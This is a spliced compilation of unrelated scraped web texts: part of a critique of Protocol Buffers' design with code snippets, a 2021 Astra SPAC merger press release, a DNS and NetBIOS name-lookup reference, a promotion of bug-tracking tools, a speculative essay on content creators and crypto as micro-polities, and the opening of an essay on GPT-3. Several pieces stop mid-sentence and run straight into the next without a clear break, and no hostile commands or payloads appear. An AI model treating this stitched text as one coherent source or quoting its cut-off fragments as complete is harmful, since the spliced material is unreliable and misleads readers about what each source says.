<span id="cb2-2">  Unit empty = <span>0</span>;</span>
<span id="cb2-3">  Pair&lt;t, List&lt;t&gt;&gt; cons = <span>1</span>;</span>
<span id="cb2-4">}</span></code></pre></div>
<p>Of course, the actual serialization logic is allowed to do something smarter than pushing linked-lists across the network—after all, <a href="https://reasonablypolymorphic.com/blog/follow-the-denotation/">implementations and semantics don’t need to align one-to-one</a>.</p>
<h3 id="questionable-choices">Questionable Choices</h3>
<p>In the vein of Java, protobuffers make the distinction between <em>scalar</em> types and <em>message</em> types. Scalars correspond more-or-less to machine primitives—things like <code>int32</code>, <code>bool</code> and <code>string</code>. Messages, on the other hand, are everything else. All library- and user-defined types are messages.</p>
<p>The two varieties of types have completely different semantics, of course.</p>
<p>Fields with scalar types are always present. Even if you don’t set them. Did I mention that (at least in proto3<a href="#fn1" id="fnref1" role="doc-noteref"><sup>1</sup></a>) all protobuffers can be zero-initialized with absolutely no data in them? Scalar fields get false-y values—<code>uint32</code> is initialized to <code>0</code> for example, and <code>string</code> is initialized as <code>""</code>.</p>
<p>It’s impossible to differentiate a field that was missing in a protobuffer from one that was assigned to the default value. Presumably this decision is in place in order to allow for an optimization of not needing to send default scalar values over the wire. Presumably, though the <a href="https://developers.google.com/protocol-buffers/docs/encoding">encoding guide</a> makes no mention of this optimization being performed, so your guess is as good as mine.</p>
<p>As we’ll see when we discuss protobuffers’ claim to being god’s gift to backwards- and forwards-compatible APIs, this inability to distinguish between unset and default values is a nightmare. Especially if indeed it’s a design decision made in order to save one bit (set or not) per field.</p>
<p>Contrast this behavior against message types. While scalar fields are dumb, the behavior for message fields is outright <em>insane.</em> Internally, message fields are either there or they’re not—but their behavior is crazy. Some pseudocode for their accessor is worth a thousand words. Pretend this is Java or something similar:</p>
<div id="cb3"><pre><code><span id="cb3-1"><span>private</span> Foo m_foo;</span>
<span id="cb3-2"></span>
<span id="cb3-3"><span>public</span> Foo foo {</span>
<span id="cb3-4">  <span>// only if `foo` is used as an expression</span></span>
<span id="cb3-5">  get {</span>
<span id="cb3-6">    <span>if</span> (m_foo != <span>null</span>)</span>
<span id="cb3-7">      <span>return</span> m_foo;</span>
<span id="cb3-8">    <span>else</span></span>
<span id="cb3-9">      <span>return</span> <span>new</span> <span>Foo</span>();</span>
<span id="cb3-10">  }</span>
<span id="cb3-11"></span>
<span id="cb3-12">  <span>// instead if `foo` is used as an lvalue</span></span>
<span id="cb3-13">  mutable get {</span>
<span id="cb3-14">    <span>if</span> (m_foo = <span>null</span>)</span>
<span id="cb3-15">      m_foo = <span>new</span> <span>Foo</span>();</span>
<span id="cb3-16">    <span>return</span> m_foo;</span>
<span id="cb3-17">  }</span>
<span id="cb3-18">}</span></code></pre></div>
<p>The idea is that if the <code>foo</code> field is unset, you’ll see a default-initialized copy whenever you ask for it, but won’t actually modify its container. But if you modify <code>foo</code>, it will modify its parent as well! All of this just to avoid using a <code>Maybe Foo</code> type and the associated “headaches” of the nuance behind needing to figure out what an unset value should mean.</p>
<p>This behavior is especially egregious, because it breaks a law! We’d expect the assignment <code>msg.foo = msg.foo;</code> to be a no-op. Instead the implementation will actually silently change <code>msg</code> to have a zero-initialized copy of <code>foo</code> if it previously didn’t have one.</p>
<p>Unlike scalar fields, at least it’s possible to detect if a message field is unset. Language bindings for protobuffers offer something along the lines of a generated <code>bool has_foo()</code> method. In the frequent case of copying a message field from one proto to another, iff it was present, you’ll need to write the following code:</p>
<div id="cb4"><pre><code><span id="cb4-1"><span>if</span> (src.has_foo(src)) {</span>
<span id="cb4-2">  dst.set_foo(src.foo());</span>
<span id="cb4-3">}</span></code></pre></div>
<p>Notice that, at least in statically-typed languages, this pattern <em>cannot be abstracted</em> due to the nominal relationship between the methods <code>foo()</code>, <code>set_foo()</code> and <code>has_foo()</code>. Because all of these functions are their own <em>identifiers</em>, we have no means of programmatically generating them, save for a preprocessor macro:</p>
<div id="cb5"><pre><code><span id="cb5-1"><span>#define COPY_IFF_SET</span>(src,<span> </span>dst,<span> </span>field)<span> </span>\</span>
<span id="cb5-2"><span>if</span><span> </span>(src.<span>has_</span><span>##</span>field(src))<span> </span>{<span> </span>\</span>
<span id="cb5-3"><span>  </span>dst.<span>set_</span><span>##</span>field(src.field());<span> </span>\</span>
<span id="cb5-4">}</span></code></pre></div>
<p>(but preprocessor macros are verboten by the <a href="https://google.github.io/styleguide/cppguide.html#Preprocessor_Macros">Google style guide</a>.)</p>
<p>If instead all optional fields were implemented as <code>Maybe</code>s, you’d get abstract-able, referentially transparent call-sites for free.</p>
<p>To change tack, let’s talk about another questionable decision. While you can define <code>oneof</code> fields in protobuffers, their semantics are <em>not</em> of coproduct types! Rookie mistake my dudes! What you get instead is an optional field for each case of the <code>oneof</code>, and magic code in the setters that will just unset any other case if this one is set.</p>
<p>At first glance, this seems like it should be semantically equivalent to having a proper union type. But instead it is an accursed, unutterable source of bugs! When this behavior teams up with the law-breaking implementation of <code>msg.foo = msg.foo;</code>, it allows this benign-looking assignment to silently delete arbitrary amounts of data!</p>
<p>What this means at the end of the day is that <code>oneof</code> fields do not form law-abiding <code>Prism</code>s, nor do messages form law-abiding <code>Lens</code>es. Which is to say good luck trying to write bug-free, non-trivial manipulations of protobuffers. It is <em>literally impossible to write generic, bug-free, polymorphic code over protobuffers.</em></p>
<p>That’s not the sort of thing anybody likes to hear, let alone those of us who have grown to love parametric polymorphism—which gives us the <em>exact opposite promise.</em></p>
<h2 id="the-lie-of-backwards--and-forwards-compatibility">The Lie of Backwards- and Forwards-Compatibility</h2>
<p>One of the frequently cited killer features of protobuffers is their “hassle-free ability to write backwards- and forwards-compatible APIs.” This is the claim that has been pulled over your eyes to blind you from the truth.</p>
<p>What protobuffers are is <em>permissive.</em> They manage to not shit the bed when receiving messages from the past or from the future because they make absolutely no promises about what your data will look like. Everything is optional! But if you need it anyway, protobuffers will happily cook up …</p></div></div>

<p><em>BlackRock-managed funds and accounts lead investment in Astra to launch a new generation of space services to improve life on Earth</em></p>
<p>ALAMEDA, Calif., February 2, 2021 – Astra, the fastest privately-funded company in history to demonstrate orbital launch capability, and Holicity Inc. (NASDAQ: HOL) (“Holicity”), a special purpose acquisition company (“SPAC”), today announced a definitive business combination agreement that will result in Astra becoming a publicly traded company. The transaction reflects an implied pro-forma enterprise value for Astra of approximately $2.1 billion. Upon closing, the transaction is expected to provide up to $500 million in cash proceeds, including up to $300 million of cash held in the trust account of Holicity and an upsized $200 million PIPE led by funds and accounts managed by BlackRock.</p>
<p>“This transaction takes us a step closer to our mission of improving life on Earth from space by fully funding our plan to provide daily access to low Earth orbit from anywhere on the planet,” said Chris Kemp, Founder, Chairman and CEO of Astra.</p>
<p>“I have long believed space provides an unmatched opportunity to benefit and enrich society,” said Craig McCaw, Chairman and CEO of Holicity. “Astra’s space platform will further improve our communications, help us protect our planet, and unleash entrepreneurs to launch a new generation of services to enhance our lives.”</p>
<p>In December 2020, Astra joined a small, elite group of companies that have made it to space. With over 50 launches in manifest across more than 10 private and public customers, including NASA and DOD, Astra has booked over $150 million of contracted launch revenue. Astra will begin delivering customer payloads this summer and begin monthly launches by the end of this year.</p>
<p>Following the closing of the transaction, the combined company will continue to be led by Founder and CEO Chris Kemp. It is expected that Craig McCaw will join Astra’s board of directors.</p>
<p>The proposed transaction, which is expected to be completed in the second quarter of 2021, has been unanimously approved by the boards of directors of both Astra and Holicity and remains subject to approval by Holicity’s stockholders. Upon the closing of the transaction, the combined company will be named Astra and will be listed on NASDAQ under the symbol “ASTR.”</p>
<h3>Transaction Overview</h3>
<p>Holicity, which currently holds over $300 million of cash in trust, will combine with Astra in a</p>
<p>transaction that is estimated to result in a pro forma enterprise value of approximately $2.1 billion. Cash proceeds in connection with the transaction will be funded through a combination of Holicity’s $300 million cash in trust and a $200 million fully committed common stock PIPE at $10.00 per share, led by funds and accounts managed by BlackRock. Astra’s existing shareholders will hold approximately 78% of the outstanding shares of common stock of the combined company immediately following the consummation of the transaction, assuming no redemptions by Holicity’s existing public stockholders. Astra’s founders will hold their interest in the pro forma combined company through super-voting (10:1) common stock.</p>
<p>Completion of the proposed transaction is subject to approval of Holicity’s stockholders and other customary closing conditions, including a registration statement being declared effective by the Securities and Exchange Commission (“SEC”). The transaction is expected to be completed in the second quarter of 2021.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>“What’s in a name? That which we call a rose By any other name would smell as sweet.”<br> — William Shakespeare’s Romeo and Juliet, Act II Scene 1</p><h3>Intro</h3><p><span>Since humans aren’t good at memorizing IP addresses (104.104.102.64 is a bit much to remember), we need a way to convert between </span><a href="https://www.whitehouse.gov/"><span>www.whitehouse.gov</span></a><span> and that IP address.&nbsp; DNS – the Domain Name System – is the general term for this conversion between Internet names and IPs.&nbsp; We also have Netbios names which are most commonly used on networks of Windows machines but are also supported on Linux and other operating systems.</span></p><p><span>In this reference, we’ll look at the different ways of looking up DNS and Netbios names, with a focus on how the different approaches can be identified on your network.</span></p><h3>DNS Format Requests and Replies</h3><p><span>DNS (“Domain Name System”) objects are names that end in one of the common top level domains (“.com.”, “.org.”, “.jp.”, “.internal.”, etc.).&nbsp; The tools that allow you to both publish these records (DNS name servers) and look them up (resolvers, which convert them to IP addresses) are available for all platforms.</span></p><p><span>DNS can carry many more traffic types than just hostname lookups, but for this article we’ll focus just on those.</span></p><h4><span>/etc/hosts file</span></h4><p><span>Not a traffic type, but a standard file location for a static list of IPs with their hostname(s).&nbsp; Can be used to override DNS lookups.</span></p><p><span>On MacOS, Linux, and the other Unixes this is stored at /etc/hosts .&nbsp; On windows systems it’s found in c:\Windows\System32\drivers\etc\hosts .</span></p><p><span>Line format:</span></p><pre><span>ip.address</span> <span>name optionalsecondname optionalthirdname    </span> <span>#Comment</span></pre><p><span>Reference:<br></span><a href="https://en.wikipedia.org/wiki/Hosts_(file)"><span>https://en.wikipedia.org/wiki/Hosts_(file)</span></a></p><h4><span>UDP DNS</span></h4><p><span>DNS requests are sent as UDP packets to a server listening on port 53.&nbsp; Replies (with the original request, any answers, and any errors) are sent back to the original client.</span></p><p><span>These requests are unencrypted.</span></p><p><span>To see what name servers a system is using look at the “nameserver ….” lines in /etc/resolv.conf on Macs and Linux systems, or see the DNS settings under “Network Properties/Advanced” in Windows settings.</span></p><p><span>References:<br></span><a href="https://www.rfc-editor.org/rfc/rfc1035.txt"><span>https://www.rfc-editor.org/rfc/rfc1035.txt</span></a><br><a href="https://en.wikipedia.org/wiki/Domain_Name_System"><span>https://en.wikipedia.org/wiki/Domain_Name_System</span></a></p><h4><span>TCP DNS</span></h4><p><span>Similar to UDP DNS, these TCP connections are sent to port 53 at the server.&nbsp; Replies come back in the same connection.&nbsp; TCP DNS is primarily used for Zone transfers (sending an entire zone from the master DNS server to the slave).&nbsp; It was also used for large answers, though these can usually be handled in UDP DNS now.&nbsp; These may not be used at all if TCP port 53 traffic is blocked at the firewall.</span></p><p><span>Like UDP DNS, these are unencrypted.</span></p><p><span>References:<br></span><a href="https://www.rfc-editor.org/rfc/rfc1035.txt"><span>https://www.rfc-editor.org/rfc/rfc1035.txt</span></a><br><a href="https://en.wikipedia.org/wiki/Domain_Name_System"><span>https://en.wikipedia.org/wiki/Domain_Name_System</span></a></p><h4><span>Multicast DNS/mDNS</span></h4><p><span>Multicast DNS uses (almost) the same packet format as UDP DNS requests and replies.&nbsp; Unlike UDP DNS, mDNS is sent and received on the local network only.</span></p><p><span>All hostnames in mDNS should end in “.local.” instead of one of the normal top level domains like “.com.” or “.us.”.&nbsp;&nbsp;</span></p><p><span>Traffic sent to one of two multicast addresses: 224.0.0.251 (mac: 01:00:5E:00:00:FB) or ff02::fb (mac: 33:33:00:00:00:FB), udp port 5353</span></p><p><span>mDNS traffic is unencrypted.</span></p><p><span>References:<br></span><a href="https://en.wikipedia.org/wiki/Multicast_DNS"><span>https://en.wikipedia.org/wiki/Multicast_DNS</span></a><br><a href="https://www.eiman.tv/blog/posts/lannames/"><span>https://www.eiman.tv/blog/posts/lannames/</span></a></p><h4><span>Link-Local Multicast Name Resolution/LLMNR</span></h4><p><span>LLMNR is very similar to mDNS; they both use (mostly) multicast and are both intended for clients and servers on the same network.</span></p><p><span>Where mDNS has all objects under the “.local.” top level domain, LLMNR can be used to publish real DNS objects, and therefore could conflict with real DNS requests (though it’s </span><i><span>supposed</span></i><span> to be queried after a real DNS lookup has failed).</span></p><p><span>Server listens on 224.0.0.252 (mac: 01:00:5E:00:00:FC) and/or FF02::1:3 (mac: 33:33:00:01:00:03), UDP port 5355 and/or TCP port 5355</span></p><p><span>LLMNR was originally designed for Windows, though a Linux implementation exists as well.&nbsp; There does not appear to be an OS/X implementation.&nbsp; Since Windows 10 supports mDNS and LLMNR was not accepted by the IETF, mDNS is the more likely interoperable tool.</span></p><p><span>LLMNR is unencrypted.</span></p><p><span>References:<br></span><a href="https://en.wikipedia.org/wiki/Link-Local_Multicast_Name_Resolution"><span>https://en.wikipedia.org/wiki/Link-Local_Multicast_Name_Resolution</span></a><br><a href="https://www.eiman.tv/blog/posts/lannames/"><span>https://www.eiman.tv/blog/posts/lannames/</span></a></p><h4><span>DNS over TLS (DoT)</span></h4><p><span>This approach takes standard DNS requests and places them inside a TLS outer shell.&nbsp; These encrypted packets are sent to a DoT server on TCP port 853.</span></p><p><span>Servers:<br></span><a href="https://dnsprivacy.org/wiki/display/DP/DNS+Privacy+Public+Resolvers"><span>https://dnsprivacy.org/wiki/display/DP/DNS+Privacy+Public+Resolvers</span></a><br><a href="https://www.privacytools.io/providers/dns/"><span>https://www.privacytools.io/providers/dns/</span></a><br><a href="https://en.wikipedia.org/wiki/Public_recursive_name_server"><span>https://en.wikipedia.org/wiki/Public_recursive_name_server</span></a></p><p><span>References:<br></span><a href="https://tools.ietf.org/html/rfc7858"><span>https://tools.ietf.org/html/rfc7858</span></a><br><a href="https://en.wikipedia.org/wiki/DNS_over_TLS"><span>https://en.wikipedia.org/wiki/DNS_over_TLS</span></a></p><h4><span>DNS over HTTPS (DoH)</span></h4><p><span>Similar to DNS over TLS, except that the requests are placed inside of an encrypted HTTPS connection to TCP port 443 instead of a raw TLS connection.</span></p><p><span>Known DoH server lists:</span></p><p><a href="https://github.com/curl/curl/wiki/DNS-over-HTTPS"><span>https://github.com/curl/curl/wiki/DNS-over-HTTPS</span></a></p><p><a href="https://github.com/dnscrypt/dnscrypt-resolvers"><span>https://github.com/dnscrypt/dnscrypt-resolvers</span></a></p><p><a href="https://dnsprivacy.org/wiki/display/DP/DNS+Privacy+Public+Resolvers"><span>https://dnsprivacy.org/wiki/display/DP/DNS+Privacy+Public+Resolvers</span></a></p><p><a href="https://www.privacytools.io/providers/dns/"><span>https://www.privacytools.io/providers/dns/</span></a></p><p><a href="https://support.opendns.com/hc/en-us/articles/360038086532-Using-DNS-over-HTTPS-DoH-with-OpenDNS"><span>https://support.opendns.com/hc/en-us/articles/360038086532-Using-DNS-over-HTTPS-DoH-with-OpenDNS</span></a></p><p><a href="https://raw.githubusercontent.com/DNSCrypt/dnscrypt-resolvers/master/v3/public-resolvers.md"><span>https://raw.githubusercontent.com/DNSCrypt/dnscrypt-resolvers/master/v3/public-resolvers.md</span></a></p><p><a href="https://en.wikipedia.org/wiki/Public_recursive_name_server"><span>https://en.wikipedia.org/wiki/Public_recursive_name_server</span></a></p><p><span>Additional DOH servers:</span></p><p><span>Quad9 dns.quad9.net, dns9.quad9.net, dns10.quad9.net 9.9.9.9, 9.9.9.10, 149.112.112.112, 149.112.112.9, 149.112.112.10 2620:fe::fe, 2620:fe::fe:9, 2620:fe::9, 2620:fe::fe:9, 2620:fe::10, 2620:fe::fe:10</span></p><p><span>Google dns.google, dns.google.com 8.8.8.8, 8.8.4.4 2001:4860:4860::8888, 2001:4860:4860::8844</span></p><p><span>Cloudflare cloudflare-dns.com, mozilla.cloudflaredns.com 1.1.1.1, 1.0.0.1, 104.16.249.249, 104.16.248.249 2606:4700:4700::1111, 2606:4700:4700::1001, 2606:4700::6810:f9f9, 2606:4700::6810:f8f9</span></p><p><span>References:<br></span><a href="https://tools.ietf.org/html/rfc8484"><span>https://tools.ietf.org/html/rfc8484</span></a><br><a href="https://en.wikipedia.org/wiki/DNS_over_HTTPS"><span>https://en.wikipedia.org/wiki/DNS_over_HTTPS</span></a></p><h4><span>Oblivious DNS over HTTPS (ODoH)</span></h4><p><span>Like DoH, but requests are routed through a proxy first so the HTTPS DNS server cannot correlate the request with its original source IP and the proxy cannot see the actual queries and responses.&nbsp;

                    <p>Testing and bug tracking are fundamental to development projects and should happen frequently throughout each stage of the development process.</p>
                    <p>To properly test and track, you need software that makes the feedback process fast and easy. However, not all software applications live up to their advertised promises. If you want a fast, smooth, and accurate bug tracking and testing process, you need the following types of software applications.</p>
                </div>
            </section>

            <section>
                <div>
                    <h2>1. Task management software that supports task grouping</h2>
                    <p>You probably have task management software already. That’s great, but does your task management program support grouping your tasks or hiding tasks that aren’t pressing for the day? And how about setting reminders and flagging tasks as high priority to ensure they get done on time?</p>
                    <p>Technically, you should have separate bug tracking software, but you’ll need to break that process down into multiple tasks and maybe even sub-tasks. That’s where things can get messy in your task management application.</p>
                    <p>Tasks related to fixing bugs are more likely to be ongoing with a future due date that changes as you progress. This means you’ll always see those tasks in your daily to-do list and that can feel overwhelming.</p>
                    <p>Working on your daily tasks can be stressful when you can’t categorize or tag tasks in a meaningful way. You’ll see every task at once and that creates pressure.</p>
                    <p>If you’re going to manage your debugging tasks, your software needs several capabilities:</p>
                    <ul>
                        <li>The ability to hide tasks or at least separate them from your normal daily tasks.</li>
                        <li>The ability to group tasks together to organize your workspace.</li>
                        <li>The ability to track progress, set due dates and reminders.</li>
                    </ul>
                    <p>If you haven’t found a task management platform that supports these needs, <a target="_blank" href="https://www.teamwork.com/solutions/task-management-software/">check out Teamwork</a>. Teamwork allows you to create highly detailed tasks, with all the features you need to manage your workload, track your progress, and optimize your workflows.</p>

                    <h2>2. Screenshot testing software for multiple browsers</h2>
                    <p>Being able to see how a development project looks in different browsers is critical. Whether you’re launching a website or a software application, browsers will display your project differently. Slight differences may not be a problem, but when a user reports a major problem on a specific device, you’ll want to see exactly what they see.</p>
                    <p>One of the best tools for seeing your projects virtually on multiple browsers is <a target="_blank" href="https://www.browserstack.com/screenshots">BrowserStack</a>. With this tool you can see what your project looks like on more than 2,000 browsers and devices. You can choose to view your project on any number of devices or browsers, including older versions of Chrome, IE, Firefox, and Opera.</p>

                <div>
                    <h2>3. Userback for collecting specific feedback</h2>
                    <p>You need to generate specific, actionable feedback throughout the development process. It’s not enough to ask clients or end users to email you their thoughts if they run into problems. If you go that route, you’ll end up with an abundance of emails that might feel more like nit picking than usable feedback. </p>
                    <p>One of the biggest frustrations developers face is <a target="_blank" href="https://www.eurogamer.net/articles/2017-07-19-a-devs-eye-view-of-bugs">getting unspecific comments from users</a>. Expert game developers constantly lament over comments like, “your game is broken—please fix it.” Software developers experience the same frustration. However, when you don’t give people an opportunity to provide specific feedback, you can expect random emails with generalized demands to fix unspecified problems.</p>
                    <p>If you’re going to collect feedback productively, you need a way to provide immediate feedback as they experience the problem. Otherwise, random, unspecific feedback is all you’ll ever get.</p>
                    <p><a href="https://www.userback.io/use-cases/bug-tracking">Userback solves this problem</a> by making it effortless for clients and customers to send you detailed, specific feedback regarding bugs as they occur. All they have to do is click a button on the side of your page and give feedback by typing into a text box, recording a video of a bug, or taking a screenshot with annotations directly from the webpage.</p>

                    <h2>4. Userback for visual bug reporting software</h2>
                    <p>You’re probably already using bug tracking software to identify bugs and find repetitive issues. Hopefully, your bug tracking software prioritizes issues so you can focus on the high priority issues first. All this is absolutely necessary, but it’s not enough if your goal is to fix bugs fast.</p>
                    <p><a href="https://dzone.com/articles/why-is-bug-tracking-tool-so-important-for-the-test" target="_blank">Bug testing and reporting are critical</a>, but traditional bug reports are challenging and time-consuming to decipher. To fix a bug, you need to replicate that bug, and text summaries make that difficult. </p>
                    <p>Most people don’t have the patience or technical knowledge to describe a bug in full detail, which means you may not be able to easily replicate that bug when reported. You might need to do some guesswork, set up specific parameters, and run your program over a period of days or weeks in an attempt to replicate a bug.</p>
                    <p>When you can’t replicate a bug, you can’t solve the problem. When you can’t replicate a bug quickly, you’ll be slow to solve the problem, which will only upset your end users and your clients. Userback solves this major issue and makes bug reporting and resolution fast.</p>
                    <p>With a simple screen recording, <a href="https://www.userback.io/blog/visual-bug-tracking">Userback collects bug reports in a visual format</a>. For example, a client or customer can record a bug in action using the video screen capture feature. It’s hard to replicate a bug based on text-only summaries. When you can see a video of what the user did to initiate the bug, you’ll know exactly how to replicate it, and you’ll be one step closer to a solution.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="div_block-73-2180"><div id="inner_content-74-2180"><section id="section-2-306"><div><div id="inner_content-3-306"><p>Legacy institutions are at war with distributed collective intelligence, but the legacy institutions are losing—badly.</p>
<p>2 million full-time “content creators,” outside any professional sanction; the election of Donald Trump against an airtight media consensus certain of its impossibility; mass, hysterical preference falsification due to a normalization of political correctness, with silent mass migration into countless private communities; Big Tech’s capitulation to censorship on all major social platforms; the resilient rise in the price of Bitcoin and a proliferation of <a href="https://forefront.market/ranking">durable social currencies on Ethereum;</a> and most recently, an unprecedented execution of decentralized social intelligence, which minted more than a few millionaires out of thin air, by <a href="https://share.transistor.fm/s/05408a92">a niche internet community hacking the source code of finance capitalism.</a></p>
<p>Most of the essential requirements for a functioning polity—fiat currency, leaders, laws, and shared identity—have been fully decoded and open-sourced in the form of cryptocurrencies, content creators, Smart Contracts, and fandoms. It seems inevitable that our roughly 195 nation states must increasingly give way to thousands of digital micro-polities, as these embryonically political structures grow in economic and psychological power.</p>
<p>The only other defining characteristic of autonomous polities—a monopoly on the use of force—is increasingly obsolete as the payoff to peaceful trade raises the opportunity cost of physical violence. Hence the relative dearth of interstate war since the end of World War II.</p>
<p>If you doubt the claim that “content creators” are budding politicians—whether they know it or not—consider the curious case of Mr. Beast.</p>
<p>The most powerful Youtubers are accidentally rediscovering the nature of Aristocracy, a type of social role we like to think we abolished.</p>
<p>Mr. Beast is a Youtuber who currently enjoys 52 million subscribers and earns somewhere in the ballpark of $20-30 million annually at the age of 22. Jimmy Donaldson built one of the most influential and economically successful Youtube channels through a specific concept: Outrageous and conspicuous acts of generosity. His typical video involves him gifting large sums of money or lavish objects to random people, poor people, or friends.</p>
<p>As true aristocrats have always known, and as contemporary elites have forgotten, lavish generosity towards the needy demonstrates one’s authentic nobility, wins public attention and admiration, and genuinely improves society while increasing the political and economic power of the donor.</p>
<p>The so-called “creator economy” is only a becoming-liquid of the circuit connecting noble traits, admiration, and capital, such that the previously abolished form of Aristocracy re-appears in a distributed and ungovernable format. You could try to govern it, but you would need someone as organically admirable as the target, or else Mr. Beast fans will never even hear about your new law, let alone respect it (especially after they upload themselves full-time to the Mr. Beast VR pod and earn all of their income through Mr. Beast’s branded gaming engine). National law enforcement does not generally excel in the domain of authentic nobility, ergo the new form of distributed Aristocracy will not be put back in the bottle.</p>
<p>I am not suggesting Mr. Beast will become the effective President of a new country within the United States. I am suggesting Mr. Beast will be one of <em>thousands</em> who effectively constitute micro-polities, each one optimizing for different personality types and demographic buckets. Power laws dictate a small minority of creators will enjoy audiences far larger than the rest, but I suspect at least several thousands of creators will operate all-inclusive <em>weltanschauungen</em> for audiences of several thousands. I am pulling these specific numbers out of thin air, but I am directionally confident; I would encourage someone to explore more sophisticated modeling of this question.</p>
<p>If you still doubt that someone like Mr. Beast is an embryonic statesman, you might be impressed to learn about his long-term goal. His stated goal is to create a nation-wide system of homeless shelters and food banks. That’s right, he’s going to build a <a href="https://www.tubefilter.com/2020/11/19/mrbeast-philanthropy-food-bank/">national system of public housing.</a> I see no reason why he cannot succeed, given that he has already proven a business model that turns charismatic philanthropy into attention, admiration, and wealth for himself. Given that the USA Department of Housing and Urban Development doesn’t even try to create housing any more, it is not particularly speculative or sci-fi to suggest that Mr. Beast is on his way to becoming a kind of shadow Secretary of Housing in the United States. It’s there for the taking, it’s his stated goal, and he’s on track to do it. If he falters, it’s hard to imagine that the next generation of creators will also fail to appreciate such historic opportunities in front of them.</p>
<p>Bitcoin feeds directly into content creators becoming governors, not additively but multiplicatively—in a few ways. This means you should watch out for non-linear takeoffs, where things seem to be unfolding gradually, gradually… and then all at once.</p>
<p>First of all, Bitcoin is becoming the leading inflation-hedge asset as the US government engages in unprecedented money printing. Censorship-resistant and inflation-proof money is becoming increasingly accessible, normalized, and trusted at the same time that legacy institutions are doubling down on… censorship and inflation. It’s not inconceivable that eventually the US government needs Bitcoin—and the intellectual/communication services of leading content creators—much more than anyone needs the US government. If the US government’s balance sheet gets worse, and Bitcoin continues to get better, this alone could trigger a non-linear event where all smart money rushes into Bitcoin rapidly, and the US government’s balance sheet collapses with equal rapidity.</p>
<p>Second, most of the leading content creators have hardly even begun utilizing cryptocurrency. They will. Given the mimetic nature of financial value, leading Youtubers could single-handedly increase the price of any given cryptocurrency, simply by promoting it, using it, and whipping their fans into a frenzy.</p>
<p>Just recently Elon Musk put the word “Bitcoin” in his Twitter profile and <a href="https://www.coindesk.com/elon-musk-prompted-bitcoin-price-surge-causes-liquidation-of-387m-in-shorts">the price of Bitcoin immediately rose 15%.</a> If for any reason Bitcoin becomes fashionable among leading creators, the result will be non-linear. The creators would be making themselves even richer, simply by adopting Bitcoin and triggering price increases, so I consider this to be a game-theoretic inevitability (even if many don’t want to take this opportunity at time t1, rising creators who do take this opportunity at time t2 will dominate the others, which means it is hard to imagine a future in which this opportunity is not taken).</p>
<p>Just as we watched the Reddit community Wallstreetbets pump the price of Gamestop on the stock exchange, without a leader, any community with a leader will be all the more capable of such a feat. The Robinhood app was able to halt purchases of Gamestop, but there already exist decentralized crypto exchanges, on which nobody has the power to halt trades. Technically unstoppable versions of the Gamestop pump therefore seem inevitable on decentralized exchanges, meaning communities will eventually have unprecedented power to affect the value of assets by sheer belief and collective will.</p>
<p>There is already a new breed of avant-garde content creators—small compared to Mr. Beast but large enough to be dangerous—investing heavily in crypto assets and infrastructure. Consider Trevor McFedries, creator of the first CGI influencer Lil’ Miquela. He’s minted his own social currency $FWB on the Ethereum blockchain, and its value has been <a href="https://www.coingecko.com/en/coins/friends-with-benefits">rising steadily</a> as the value of his community increases. If he and his community continue to create value inside the community, the value of $FW will continue to rise, and everyone in the community will see their wealth increase in proportion to their $FWB holdings. It is hard to imagine that there will not eventually be a creator as big as Mr. Beast and as crypto-savvy as McFedries, who runs a private digital community with a market cap as great as the GDP of many countries.</p>
<p>The most influential content creators will build cabinets of advisors and shareholders drawn from different domains: A chief technologist drawn from Silicon Valley, a chief financial officer drawn from Wall Street, etc. This is when the political nature of content creators will become unmistakable. These companies will look and feel like small national governments, running a combination of revenue-generating enterprises for profit and philanthropic enterprises for citizen-recruitment, all organized around their own state-sponsored media.</p>
<p>The nation state may well persist, but only as a shell of its former self, and mainly by hitching its wagon to the leading micro-polities. One can imagine a scenario in which Heads of State and leading content creators broker an informal bargain that allow Heads of State to save face on condition they defer to the new power-holders. In the near future, the relationship of the US President and leading American Youtubers may be analogous to the relationship between the Queen of England and Parliament.</p>
<p>Many micro-polities will initially appear to mainstream observers as religious “cults,” driven by “conspiracy theories,” led by charismatic “grifters,” operating massive “pyramid schemes.” Eventually it will be realized that such things have always been the building blocks of nations. As the myth of Romulus attests, the founding of a nation is always a crime—until it’s the law.</p>

<div><p>It is a profoundly erroneous truism … that we should cultivate the habit of thinking of what we are doing. The precise opposite is the case.</p><p>Civilization advances by extending the number of important operations which we can perform without thinking about them.</p><p>— Alfred North Whitehead, “An Introduction to Mathematics,” 1911</p></div>



<p>GPT-3 is the latest attempt by OpenAI, a tech research lab in San Francisco, to unlock artificial intelligence with an anvil rather than a hairpin. As brute force strategies go, the results are impressive. The language-generating model performs well across a striking range of contexts. Given only simple prompts, GPT-3 writes not just interesting short stories and clever songs, but also executable code such as web graphics.</p>



<p>GPT-3’s ability to dazzle with prose and poetry that appears entirely natural, even erudite or lyrical, is less surprising. It’s a parlor trick that its predecessor performed a year earlier, though its then-massive 1.5 billion parameters are swamped by GPT-3’s power, which uses <em>175</em> billion parameters to enhance its stylistic abstractions and semantic associations.</p>



<p>Just like their great-grandmother, Joseph Weizenbaum’s ELIZA, a natural language processing program developed in the 1960s, these systems benefit considerably from human reliance on familiar heuristics for speakers’ cognitive abilities. GPT-3 readily deploys artful and sonorous speech rhythms, sophisticated vocabularies and references, and erudite grammatical constructions. Like the bullshitter who gets past their first interview by regurgitating impressive-sounding phrases from the memoir of the company’s CEO, GPT-3 spits out some pretty good <a href="https://press.princeton.edu/books/hardcover/9780691122946/on-bullshit" data-wpel-link="external" target="_blank" rel="external noopener noreferrer">bullshit</a>.</p>



<p>Yet the connections GPT-3 makes are not illusory or concocted from thin air. It and many other machine learning models for natural language processing and generating do, in fact, track and reproduce real features of the symbolic order in which humans express thought. And yet, they do so without needing to <em>have</em> any thoughts to express.</p>



<p>The hype around GPT-3 as a path to general artificial intelligence reveals the sterility of mainstream thinking about AI today. More importantly, it reveals the sterility of our current thinking about <em>thinking</em>.</p>

      “Like the bullshitter who gets past their first interview by regurgitating impressive-sounding phrases from the memoir of the company’s CEO, GPT-3 spits out some pretty good bullshit.”    </p>

    
    
  </div>
</div>




<p>A growing number of today’s cognitive scientists, neuroscientists and philosophers are aggressively pursuing well-funded research projects devoted to revealing the underlying causal mechanisms of thought, and how they might be detected, simulated or even replicated by machines. But the <em>purpose </em>of thought — what thought is <em>good</em> for — is a question widely neglected today, or else taken to have trivial, self-evident answers. Yet the answers are neither unimportant, nor obvious.</p>



